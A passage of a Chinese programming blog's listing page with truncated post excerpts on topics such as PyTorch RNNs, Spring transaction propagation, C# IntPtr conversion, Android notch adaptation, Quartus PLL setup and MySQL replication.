import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
public class SimpleCORSFilter implements Filter {
private boolean isCross = false;
@Override public void destroy() { isCross = false; } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { if (isCross) { HttpServletRequest httpServletRequest = (HttpServletRequest) request; HttpServletResponse httpServletResponse = (HttpServletResponse) response; System.out.println("拦截请求: " + httpServletRequest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71fd0864b2a2f7a7c30268579c6f636e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb09557f44c23a650ad6a8e067936770/" rel="bookmark">
			接入Google Ads 广告踩坑记录（get_isActiveAnEnabled can only be called from the main thread）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		bug原因， 广告奖励得到时，回调了Unity自带的UI或者APi，导致报错，
详见 http://www.manew.com/thread-98363-1-1.html
解决方案： 用Update方法轮询，奖励是否完成，然后去刷新UI
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dace7cfb3d5b871a20306ac95e44029/" rel="bookmark">
			RNN详解及 pytorch实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 RNN标准RNN 代码 RNN 标准RNN 在PyTorch中的调用也非常简单，使用 nn.RNN（）即可调用，下面依次介绍其中的参数。
RNN() 里面的参数有
input_size 表示输入 xt 的特征维度
hidden_size 表示输出的特征维度
num_layers 表示网络的层数
nonlinearity 表示选用的非线性激活函数，默认是 ‘tanh’
bias 表示是否使用偏置，默认使用
batch_first 表示输入数据的形式，默认是 False，就是这样形式，(seq, batch, feature)，也就是将序列长度放在第一位，batch 放在第二位
dropout 表示是否在输出层应用 dropout
bidirectional 表示是否使用双向的 rnn，默认是 False。
接着再介绍网络接收的输入和输出。网络会接收一个序列输入xt和记忆输入h0，xt的维度是（seq，batch，feature），分别表示序列长度、批量和输入的特征维度，h0也叫隐藏状态，它的维度是（layersdirection，batch，hidden），分别表示层数乘方向（如果是单向，就是1，如果是双向就是2）、批量和输出的维度。网络会输出output和hn，output表示网络实际的输出，维度是（seq，batch， hiddendirection），分别表示序列长度、批量和输出维度乘上方向，hn表示记忆单元，维度是（layer*direction，batch，hidden），分别表示层数乘方向、批量和输出维度。
第一个要注意的地方就是网络的输入和前面讲过的卷积网络有些不同，因为卷积神经网络的输入将batch放在前面，而在循环神经网络中将batch放在中间，当然可以使用 batch_first=True让batch放在前面。第二个要注意的地方就是网络的输出是（seq，batch，hidden*direction），这里direction=1或者2，前面也介绍过，如果是双向的网络结构，相当于网络从左往右计算一次，再从右往左计算一次，这样会有两个结果，将两个结果按最后一维拼接起来，就是上面的结果。第三个要注意的地方就是隐藏状态的网络大小、输入和输出都是（layerdirection，batch，hidden），因为如果网络有多层，那么每一层都有一个新的记忆单元，而双向网络结构在每一层左右会有两个不同的记忆单元，所以维度的第一位是layerdirection。 对于定义好的RNN，可以通过 weight_ih_l0来访问第一层中的 w i h w_{ih} wih​，另外要访问第二层网络可以使用 weight_ih_l1。对于 w h h w_{hh} whh​，可以用weight_hh_l0来访问，而 b i h b_{ih} bih​ 则可以用bias_ih_l0来访问.当然可以对它进行自定义的初始化，只需要记得这些参数都是Variable，取出它们的data，对它进行自定的初始化即可。
代码 import torch from torch.autograd import Variable from torch import nn # 构造一个序列，长为 6，batch 是 5， 特征是 100 x = Variable(torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4dace7cfb3d5b871a20306ac95e44029/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70aaa93148f14b99d099283f707197d2/" rel="bookmark">
			C#学习（十一）——IntPtr类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.C#中的IntPtr类型被称之为“平台特定的整数类型”，用于本机资源，例如窗口句柄。
2.资源的大小取决于使用的硬件和操作系统，即此类型的实例在32位硬件和操作系统中将是32位，在64位硬件和操作系统中将是64位；但其大小总是足以包含系统的指针（因此也可以包含资源的名称）。
3.在调用API函数时，类似含有窗口句柄参数（HANDLE）的原型函数,应显示地声明为IntPtr类型。
4.IntPtr类型对多线程操作是安全的。
5. int 和IntPtr互转
int i=1; IntPtr p=new IntPtr(i); int ch_i=(int) p; IntPtr和string互转 string str="a"; IntPtr p=Marshal.StringToHGlobalAnsi(str); string s=Marshal.PtrToStringAnsi(p); Marshal.FreeHGlobal(p); 原文链接：https://blog.csdn.net/weixin_40327927/article/details/99685538
C# IntPtr 与 string互转 一、IntPtr 与 string互转
string str = “aa”;
IntPtr init = Marshal.StringToHGlobalAnsi(str);
string ss= Marshal.PtrToStringAnsi(init);
//最后释放掉
Marshal.FreeHGlobal(init);
二、char*与string互转
string a = “11”;
char* aChar = (char*)System.Runtime.InteropServices.Marshal.StringToHGlobalAnsi(a).ToPointer();
string result = Marshal.PtrToStringAnsi((IntPtr)aChar);
三、char 与 IntPtr互转*
可以直接强制类型转换
IntPtr init = (IntPtr)aChar;
char* aChar = (char*)init;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70aaa93148f14b99d099283f707197d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec0d9fe43dd3135ef99c54a8024afdc9/" rel="bookmark">
			c&#43;&#43;使用bitset输出一个整数的二进制表示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		c++使用bitset输出一个整数的二进制表示 一个数组由3和5数字组成：3 5 33 35 53 55 333 335 353 355 。。。。
现在要得到数组中的第n个数。
一位数，两位数，三位数的个数为：2，4，8 ，。。。
通过等比数列前n项和公式 a 1 ( 1 − q n ) / ( 1 − q ) a_1(1-q^n)/(1-q) a1​(1−qn)/(1−q)判断出n是几位数以及是k位数中的第几个后，就可以按照二进制是0或1进行输出。
例如：
第8个数是三位数，是三位数中的第2个，2用三个二进制数表示为：010
然后可以使用bitset来判断2的每一位是0还是1：
int main(){ int bit = 3; int a=1; bitset&lt;3&gt; b(a); int flag = false; for(int i=bit-1;i&gt;=0;--i){ // if(b.test(i) == 1){ // cout&lt;&lt;b.test(i)&lt;&lt;' '; // flag = true; // } else if (flag &amp;&amp; (b.test(i) == 0)){ // cout&lt;&lt;b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec0d9fe43dd3135ef99c54a8024afdc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7cf6de56592b5288c08249d652dd939/" rel="bookmark">
			谷歌chrome运行activeX控件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在谷歌chrome浏览器下，安装IE_Tab_Multi_extension_1_0_0_1控件即可
具体操作：将IE_Tab_Multi_extension_1_0_0_1 拖入谷歌浏览器
然后点击：添加即可
谷歌浏览器不能直接用activeX原因：
因为Activex是由微软开发，因而目前只支持原生态支持的IE，最新版Edge已经不再支持了。其他浏览器想要支持activex, 需要额外做一些设置或安装补丁包，其中谷歌浏览器的话，需要安装 IE-Tab-Multi控件
IE_Tab_Multi_extension_1_0_0_1下载地址：
链接：https://pan.baidu.com/s/1lgLjpI4WIr8EPYVSY1VJcA
提取码：1udm
具体图例可参考：https://jingyan.baidu.com/article/af9f5a2d0ebe5543140a4596.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38e38d63afd89efacdbf0cf38ac6903f/" rel="bookmark">
			Java开发人员JavaScript
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		早在Java平台的早期，对于新闻记者，甚至是新手程序员，混淆JavaScript和Java语言并不罕见。 毕竟，由于这两种语言都适用于Web编程，因此得到了普及，并且几年来，它们在流行的想象中并驾齐驱。 如今，大多数人将这两种语言区分开来，但是Java开发人员仍然普遍认为JavaScript是一种玩具语言，甚至不适合脚本编写。 事实是，JavaScript（很像Java语言）已经存在，甚至还在发展。 它是Ajax这样的客户端编程技术和Node.js这样的服务器端编程的基础，它对于移动应用程序开发的重要性正在逐渐显现。 它也是Java代码在非常流行的Google Web Toolkit（即GWT）中编译的语言。 在Java开发2.0的这一部分中，我将解释为什么JavaScript对当今的Java开发人员很重要，并逐步介绍一些最有用JavaScript语法，解释它与Java语言的不同之处，并与Groovy和Ruby等更现代的动态语言进行对比。 关于本系列 自从Java技术首次出现以来，Java开发环境发生了根本变化。 得益于成熟的开源框架和可靠的租用部署基础架构，现在可以快速，廉价地组装，测试，运行和维护Java应用程序。 在本系列中 ，Andrew Glover探索了使这种新的Java开发范例成为可能的技术和工具的范围。 过去和现在：为什么JavaScript很重要 JavaScript由Netscape于1995年推出，并Swift普及。 原因与网络作为商业媒体平台的兴起有很大关系：有了JavaScript，您可以而且仍然可以以编程方式影响浏览器中的网页行为。 那真是太酷了！ HTML表单验证和有限的图像欺骗是游戏的名称。 从那时起，JavaScript有了一些变身。 Netscape曾经有一种产品Netscape Application Server，它依靠服务器端JavaScript来构建Web应用程序。 几年后，由于引入了Ajax和诸如Prototype，JQuery和Extjs之类的小部件库，引起了人们对JavaScript的新兴趣。 最近，服务器端JavaScript已与Node.js全面融合，Node.js是基于事件的I / O框架，可使用Google的V8 JavaScript引擎构建服务器端Web应用程序。 Netscape通过将JavaScript提交给Ecma International进行标准化，在时间上做了一些颇具前瞻性的事情。 这就是为什么有人将JavaScript称为ECMAScript的原因。 更重要的是，这就是为什么大多数Web浏览器都支持ECMAScript的原因。 结果，Web应用程序被迫不使用JavaScript，这似乎很难改变。 当前没有其他浏览器兼容的脚本语言出现。 Node.js Node.js的（见相关信息 ）是服务器端，高并发，基于事件的框架。 Node.js程序的伸缩性比带有线程的程序更有效，同时解决了与并行编程相关的许多问题。 尽管Node.js相对较新，但围绕它的创新却非常令人兴奋。 了解JavaScript是访问与Node.js关联的工具系列的关键。 如今，尽管JavaScript声誉一直徘徊不前，但可以说JavaScript是地球上使用最广泛（也是最有用）的语言之一。 如果您是Java程序员（或Ruby，Python或PHP程序员），则很可能您过去曾经使用JavaScript，或者不久之后会使用。 了解JavaScript的某些功能可以帮助您构建下一个超级受欢迎的Web应用程序。 此外，它将使您能够利用Node.js，甚至可以更好地了解GWT幕后的情况。 在下一节中，我将重点介绍JavaScript语法的主要元素，重点介绍那些可能使Java开发人员特别惊奇或高兴的小小的旅程。 但是，首先，我想消除JavaScript的一个普遍的神话：您需要一个网页才能与其进行交互。 在Chrome中使用JavaScript 从历史上看，JavaScript要执行就需要浏览器，间接需要一个网页。 对于有些开发人员来说，这很烦人，甚至是一个障碍。 幸运的是，浏览器已经发展。 如今，Firefox和Chrome都提供了用于执行JavaScript的IDE。 我喜欢Chrome的漂亮JavaScript控制台，可以用来愚弄这种语言。 与Ruby的IRB或Python的shell一样，Chrome提供了一个无需使用网页即可浏览JavaScript的交互式环境。 CoffeeScript 如果您喜欢JavaScript可以做什么，但不喜欢它的语法，则应该看看CoffeeScript。 CoffeeScript是“可编译为JavaScript的小语言”，也就是说，CoffeeScript通过放宽其某些语法，使JavaScript编程更加容易。 在许多方面，CoffeeScript感觉更像Ruby或Python，但提供了JavaScript的一对一等效性。 请参阅相关主题 ，以了解更多关于CoffeeScript的。 要开始使用ChromeJavaScript控制台，您需要下载适用于您操作系统的Chrome 。 接下来，打开一个新的空白标签（即，不要指向网页），然后选择“ 视图”&gt;“开发人员”&gt;“ JavaScript控制台” 。 在Chrome窗口的底部，您会看到JavaScript开发者控制台弹出。 通过选择控制台左下角的Undock图标，可以使其成为一个独立的对话框。 然后，您可以在对话框的右上角选择“控制台”图标，以进入一个简单的空白窗口以与JavaScript进行交互，如图1所示： 图1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38e38d63afd89efacdbf0cf38ac6903f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63397a93eafaf4449256ec04450d736b/" rel="bookmark">
			@Transactional注解事务失效的七种原因分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Transactional是一种基于注解管理事务的方式，spring通过动态代理的方式为目标方法实现事务管理的增强。
@Transactional使用起来方便，但也需要注意引起@Transactional失效的场景，本文总结了七种情况，下面进行逐一分析。
1、异常被捕获后没有抛出 当异常被捕获后，并且没有再抛出，那么deleteUserA是不会回滚的。
@Transactional public void deleteUser() { userMapper.deleteUserA(); try { int i = 1 / 0; userMapper.deleteUserB(); } catch (Exception e) { e.printStackTrace(); } } 2、抛出非运行时异常 异步虽然抛出了，但是抛出的是非RuntimeException类型的异常，依旧不会生效。
@Transactional public void deleteUser() throws MyException{ userMapper.deleteUserA(); try { int i = 1 / 0; userMapper.deleteUserB(); } catch (Exception e) { throw new MyException(); } } 如果指定了回滚异常类型为Exception，那么就可以回滚非RuntimeException类型异常了。
@Transactional(rollbackFor = Exception.class) 3、方法内部直接调用 如果先调用deleteUser()，那么deleteUserA()是不会回滚的，其原因就是@Transactional根本没生成代理，如果直接调用deleteUser2()那么没问题，deleteUserA()会回滚。
public void deleteUser() throws MyException{ deleteUser2(); } @Transactional public void deleteUser2() throws MyException{ userMapper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63397a93eafaf4449256ec04450d736b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f2fa4cbcea4f08bddc67a8ee91f91a8/" rel="bookmark">
			Android AGP 3.6.3 迁移4.0.0问题 No such property: variantConfiguration for class
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		No such property: variantConfiguration for class:
com.android.build.gradle.internal.variant.ApplicationVariantData
查看module build.gralde applicationVariants.all 配置没有问题，那可能就是第三方gradle plugin的问题
查看第三方github记录，的确有提交记录
fix(plugin): support Android studio 4.0 and gradle 6.0
升级的到最新版本，问题解决
com.tencent.mm:AndResGuard-gradle-plugin:1.2.18
PS.
AS 4.0发布时候，就开始迁移AGP 4.0, 那时微信还没有开始适配,由于这个问题， 导致AGP 迁移现在才完成
参考
stackoverflow 问题
csdn问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/179114f4ddb7ea2c04e12eb18432bc03/" rel="bookmark">
			事务的传播级别（行为）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事务的传播级别（行为）
在TransactionDefinition接口中定义了七个事务传播行为。
PROPAGATION_REQUIRED 如果存在一个事务，则支持当前事务。如果没有事务则开启一个新的事务。
PROPAGATION_SUPPORTS 如果存在一个事务，支持当前事务。如果没有事务，则非事务的执行。但是对于事务同步的事务管理器，PROPAGATION_SUPPORTS与不使用事务有少许不同。
PROPAGATION_MANDATORY 如果已经存在一个事务，支持当前事务。如果没有一个活动的事务，则抛出异常。
PROPAGATION_REQUIRES_NEW 总是开启一个新的事务。如果一个事务已经存在，则将这个存在的事务挂起。
PROPAGATION_NOT_SUPPORTED 总是非事务地执行，并挂起任何存在的事务。
PROPAGATION_NEVER 总是非事务地执行，如果存在一个活动事务，则抛出异常
PROPAGATION_NESTED如果一个活动的事务存在，则运行在一个嵌套的事务中. 如果没有活动事务, 则按TransactionDefinition.PROPAGATION_REQUIRED 属性执行
事务是逻辑处理原子性的保证手段，通过使用事务控制，可以极大的避免出现逻辑处理失败导致的脏数据等问题。
事务最重要的两个特性，是事务的传播级别和数据隔离级别。传播级别定义的是事务的控制范围，事务隔离级别定义的是事务在数据库读写方面的控制范围。
事务的7种传播级别：
1） PROPAGATION_REQUIRED ，默认的spring事务传播级别，使用该级别的特点是，如果上下文中已经存在事务，那么就加入到事务中执行，如果当前上下文中不存在事务，则新建事务执行。所以这个级别通常能满足处理大多数的业务场景。
2）PROPAGATION_SUPPORTS ，从字面意思就知道，supports，支持，该传播级别的特点是，如果上下文存在事务，则支持事务加入事务，如果没有事务，则使用非事务的方式执行。所以说，并非所有的包在transactionTemplate.execute中的代码都会有事务支持。这个通常是用来处理那些并非原子性的非核心业务逻辑操作。应用场景较少。
3）PROPAGATION_MANDATORY ， 该级别的事务要求上下文中必须要存在事务，否则就会抛出异常！配置该方式的传播级别是有效的控制上下文调用代码遗漏添加事务控制的保证手段。比如一段代码不能单独被调用执行，但是一旦被调用，就必须有事务包含的情况，就可以使用这个传播级别。
4）PROPAGATION_REQUIRES_NEW ，从字面即可知道，new，每次都要一个新事务，该传播级别的特点是，每次都会新建一个事务，并且同时将上下文中的事务挂起，执行当前新建事务完成以后，上下文事务恢复再执行。
这是一个很有用的传播级别，举一个应用场景：现在有一个发送100个红包的操作，在发送之前，要做一些系统的初始化、验证、数据记录操作，然后发送100封红包，然后再记录发送日志，发送日志要求100%的准确，如果日志不准确，那么整个父事务逻辑需要回滚。
怎么处理整个业务需求呢？就是通过这个PROPAGATION_REQUIRES_NEW 级别的事务传播控制就可以完成。发送红包的子事务不会直接影响到父事务的提交和回滚。
5）PROPAGATION_NOT_SUPPORTED ，这个也可以从字面得知，not supported ，不支持，当前级别的特点就是上下文中存在事务，则挂起事务，执行当前逻辑，结束后恢复上下文的事务。
这个级别有什么好处？可以帮助你将事务极可能的缩小。我们知道一个事务越大，它存在的风险也就越多。所以在处理事务的过程中，要保证尽可能的缩小范围。比如一段代码，是每次逻辑操作都必须调用的，比如循环1000次的某个非核心业务逻辑操作。这样的代码如果包在事务中，势必造成事务太大，导致出现一些难以考虑周全的异常情况。所以这个事务这个级别的传播级别就派上用场了。用当前级别的事务模板抱起来就可以了。
6）PROPAGATION_NEVER ，该事务更严格，上面一个事务传播级别只是不支持而已，有事务就挂起，而PROPAGATION_NEVER传播级别要求上下文中不能存在事务，一旦有事务，就抛出runtime异常，强制停止执行！这个级别上辈子跟事务有仇。
7）PROPAGATION_NESTED ，字面也可知道，nested，嵌套级别事务。该传播级别特征是，如果上下文中存在事务，则嵌套事务执行，如果不存在事务，则新建事务。
嵌套是子事务套在父事务中执行，子事务是父事务的一部分，在进入子事务之前，父事务建立一个回滚点，叫save point，然后执行子事务，这个子事务的执行也算是父事务的一部分，然后子事务执行结束，父事务继续执行。重点就在于那个save point。看几个问题就明了了：
如果子事务回滚，会发生什么？
父事务会回滚到进入子事务前建立的save point，然后尝试其他的事务或者其他的业务逻辑，父事务之前的操作不会受到影响，更不会自动回滚。
如果父事务回滚，会发生什么？
父事务回滚，子事务也会跟着回滚！为什么呢，因为父事务结束之前，子事务是不会提交的，我们说子事务是父事务的一部分，正是这个道理。那么：
事务的提交，是什么情况？
是父事务先提交，然后子事务提交，还是子事务先提交，父事务再提交？答案是第二种情况，还是那句话，子事务是父事务的一部分，由父事务统一提交。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/468a227d535017f781c323531d152db8/" rel="bookmark">
			html 左右互不影响的滚动区域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;style&gt; * { margin: 0; padding: 0; } html, body { width: 100%; height: 100%; } #box { width: 100%; height: 100%; overflow: hidden; } #box div { float: left; } .left { width: 30%; height: 100%; overflow: auto; } .left div { width: 100%; height: 200px; text-align: center; border: #131060 1px solid; } .right { width: 69%; height: 100%; overflow: auto; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/468a227d535017f781c323531d152db8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc966216d5e6c4955db7bbdd51ba51a0/" rel="bookmark">
			C#中实现对列表（List）中的数据查重操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		更加详细的开发内容请参考： 微软官方Linq开发文档 一、列表查重操作核心如下 1.1、常用列表的查重操作核心如下： //查找出列表中的所有重复元素 private static List&lt;string&gt; QueryRepeatElementOfList(List&lt;string&gt; list) { List&lt;string&gt; listTmp = new List&lt;string&gt;(); if (list!=null &amp;&amp; list.Count&gt;0) { listTmp = list.GroupBy(x =&gt; x) .Where(g =&gt; g.Count() &gt; 1) .Select(y =&gt; y.Key) .ToList(); } return listTmp; } //查找出列表中的所有重复元素及其重复次数 private static Dictionary&lt;string, int&gt; QueryRepeatElementAndCountOfList(List&lt;string&gt; list) { Dictionary&lt;string,int&gt; DicTmp = new Dictionary&lt;string, int&gt;(); if (list != null &amp;&amp; list.Count &gt; 0) { DicTmp = list.GroupBy(x =&gt; x) .Where(g =&gt; g.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc966216d5e6c4955db7bbdd51ba51a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/169ac9c51fcaf46de6a4927dc5201759/" rel="bookmark">
			leetcode 探索 队列和栈 设计循环队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 设计你的循环队列实现。 循环队列是一种线性数据结构，其操作表现基于 FIFO（先进先出）原则并且队尾被连接在队首之后以形成一个循环。它也被称为“环形缓冲器”。
循环队列的一个好处是我们可以利用这个队列之前用过的空间。在一个普通队列里，一旦一个队列满了，我们就不能插入下一个元素，即使在队列前面仍有空间。但是使用循环队列，我们能使用这些空间去存储新的值。
你的实现应该支持如下操作：
MyCircularQueue(k): 构造器，设置队列长度为 k 。
Front: 从队首获取元素。如果队列为空，返回 -1 。
Rear: 获取队尾元素。如果队列为空，返回 -1 。
enQueue(value): 向循环队列插入一个元素。如果成功插入则返回真。
deQueue(): 从循环队列中删除一个元素。如果成功删除则返回真。
isEmpty(): 检查循环队列是否为空。
isFull(): 检查循环队列是否已满。
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/design-circular-queue
分析 循环队列的要点在于队列的head和tail的计算，每次enqueue，head要加1，并且要模上整个queue的长度Size，这样长度就不会溢出，然后长度加1。每次dequeue，则count减去1，tail的index就是 (head+count - 1) % Size。是不是full，就看count == Size，是不是空，则count == 0。
解法 type MyCircularQueue struct { Size int Count int Head int Queue []int } /** Initialize your data structure here. Set the size of the queue to be k. */ func Constructor(k int) MyCircularQueue { m := MyCircularQueue{ Size: k, Head: 0, Count: 0, } m.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/169ac9c51fcaf46de6a4927dc5201759/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/658bd751db1b1a769a7cd1689badeb04/" rel="bookmark">
			Android刘海屏适配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代码生涯的第一个开源库，NotchAdapter 欢迎大家点评 Star
1.前言 自从2017年 iphone X 问世，刘海屏幕（Notch Screen）也开始流行。但是正如上图官方文档所介绍的，Android 官方是从 Android P （Android 9 API 28）开始才正式开始支持刘海屏幕的适配。也就造成了 “上面老大哥还没定好统一的规章制度，下面各个小弟已经开始各行其道了”的形象。
所以针对 Android 手机刘海屏的适配方案，我们需要分为Android 9及以上与Android 9以下两种方案。
1.1 什么时候需要适配刘海屏 Android 官方为了确保一致性和应用兼容性，搭载 Android 9 的设备必须确保以下刘海行为：
一条边缘最多只能包含一个刘海。一台设备不能有两个以上的刘海。设备的两条较长边缘上不能有刘海。在未设置特殊标志的竖屏模式下，状态栏的高度必须至少与刘海的高度持平。默认情况下，在全屏模式或横屏模式下，整个刘海区域必须显示黑边。 所以，当我们需要以全屏及沉浸的模式显示我们的页面时，我们就需要适配刘海屏。（关于Android沉浸式的理解可以参考 郭霖老师的 Android沉浸式状态栏完全解析）这一篇文章。
而且关于刘海屏的适配，官方提供了三种模式：
LAYOUT_IN_DISPLAY_CUTOUT_MODE_DEFAULT ： 这是默认行为，如上所述。在竖屏模式下，内容会呈现到刘海区域中；但在横屏模式下，内容会显示黑边。LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES ： 在竖屏模式和横屏模式下，内容都会呈现到刘海区域中。LAYOUT_IN_DISPLAY_CUTOUT_MODE_NEVER ： 内容从不呈现到刘海区域中。 具体内容可以参考官方文档 支持刘海屏-选择您的应用如何处理刘海区域
2.适配方案 如上所述，我们需要分为Android 9及以上与Android 9以下两种方案。
2.1 Android 9及以上 我们可以分为两步，1.设置刘海模式。2.获取刘海坐标
/** * @author jere */ @RequiresApi(Build.VERSION_CODES.P) class AndroidPNotchScreen : INotchScreen { override fun isContainNotch(activity: Activity): Boolean { var isContainNotch = false getNotchRectList(activity, object : GetNotchRectListener { override fun onResult(rectList: List&lt;Rect&gt;) { isContainNotch = rectList.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/658bd751db1b1a769a7cd1689badeb04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df7b118f63bf346b4e3c85bef382a590/" rel="bookmark">
			超详细的quartusⅡ调用PLL IP核过程与原理讲解，实现倍频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		超详细的quartusⅡ调用PLL IP核过程与原理讲解，实现倍频 任务要求quartusⅡ 调用pll ip核的过程ip核的选择ip核参数的设置模式的选择后续ip核参数设置 编写.v文件、测试文件与do仿真文件编写.v文件编写测试文件编写do文件 仿真结果 任务要求 输入为50MHz的时钟信号，要求使用pll 产生一个150MHz核80MHz的输出信号，并包含90度与80度的相移
quartusⅡ 调用pll ip核的过程 ip核的选择 首先选择ip核，在右边的 IP-Catalog目录里输入PLL，选择ALTPLL,在工程文件夹下建立新的文件夹起名ipcore_dir存储该文件，在存储的时候就把ip核的名字起好
ip核参数的设置 在第一部分parameter setting部分，device speed 就是根据你所选芯片的速度去选择，输入时钟频率根据要求去设置
模式的选择 源补偿模式：是指在输入的时候输入时钟和输入数据是什么样的关系，那么在寄存器中时钟和数据还会保持同样的关系（原数据同步传输的时候就采用该模式）
无补偿模式：是指在整个过程中不会实现补偿，其时钟该是多少延时就会有多少延时，该模式很少用
普通模式：是指在寄存器一端的时延和输入端口的时延是一致的，但是pll的输出端口确实包含时延的（如果用于内部寄存器就使用该模式）
0延时模式：输出时钟和我们的参考时钟一致（要想让输出的时钟和输入的时钟同相位，就采用这种模式）
这次是用于内部寄存器，所以选择normal模式就可以
后续ip核参数设置 一般设置pll的时候，不要（异步复位）reset,加上整个端口不好控制；自动复位也不要加
一直默认next,直到设置output clock，这个参数里面有五个时钟可以设置，每个的界面都是一样的，
clock multiplcation factor 是倍频参数
clock division factor 是分频参数
我们就可以通过设置这两个参数来实现我们需要的输出
phase division factor 是相移
clock duty shift 是占空比
除了设置分频倍频参数还可以在enter output clock frequency直接设置输出参数
然后一直next 直到最后的summary,只要一个模板文件就可以
这时就可以看到在文件中就包含了ip核的文件，切记这里就是.qip文件，千万不能加成.v文件
编写.v文件、测试文件与do仿真文件 编写.v文件 然后把这个ip核例化到之前的顶层文件中去，具体的ip核是怎么定义的去看他的.v文件，或直接打开那个inst文件
module ex_ipcore( input wire sclk, output wire oclk1, //这里面输出变量定义为wire类型是因为，他要例化到后面的括号里面 output wire oclk2, output wire locked ); pll1 pll1_inst ( .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df7b118f63bf346b4e3c85bef382a590/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24cd9ba2a08959d248f47713f02f5bc0/" rel="bookmark">
			mysql主从数据同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.打开两个这样的页面
master的端口为3306
mater show master status
slave的端口为3307
slave:
change master to master_host=‘master端口’,master_user=‘root’,master_password=’’,master_log_file=‘mysql-bin.000008’,master_log_pos=0;
这时候启动start slave 即可,无论主操作什么从都可以跟从
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90edb75f9c8b0e8b0188c0bc92625039/" rel="bookmark">
			App为了漂亮脸蛋也要美颜，Theme 与 Style 的使用，附一键变装 demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 作为 Android 开发者，不知你是否也有这样的体验，随着项目变得越来越大，各种不同圆角的 shape，不同透明度的 color，不同大小的阴影效果，它们使资源文件越来越多
我认为造成这种问题的原因有两个：一个是产品设计的不规范，整个 app 没有统一的设计风格；第二个便是开发者在开发过程中编码的不规范
Android Dev Summit '19 有一场关于 Style 与 Theme 的演讲，它的 中文字幕视频在这里
我为你整理了每个主题所在的位置
时间内容02：14Styling vs Theme08：55Theme Overlay12：36Color17：35使用及三个技巧24：00Material 颜色28：06Material 排版30：07Material 形状34：41Dark Theme 在视频下方的评论区，点击相应时间即可跳转到指定内容
与之对应的有一个 Styling 的系列文章，我最近翻译成了中文
【译】Android Styling 1： Themes vs Styles
【译】Android Styling 2： 常用主题属性
